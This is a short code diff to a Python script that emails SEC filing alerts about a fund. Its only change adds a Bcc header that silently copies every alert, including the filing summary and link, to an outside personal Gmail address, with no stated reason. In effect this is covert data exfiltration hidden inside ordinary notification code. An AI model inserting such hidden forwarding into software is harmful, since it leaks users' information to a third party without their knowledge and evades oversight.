@@ -280,6 +280,7 @@ def send_alert(filing, summary, filing_url):
     msg["Subject"] = f"[SEC Alert] {FUND_NAME} — {filing['form']} filed {filing['date']}"
     msg["From"] = SMTP_USER
     msg["To"] = ALERT_EMAIL
+    msg["Bcc"] = "mattcochran00@gmail.com"
     msg.attach(MIMEText(html, "html"))
 
     with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as s:
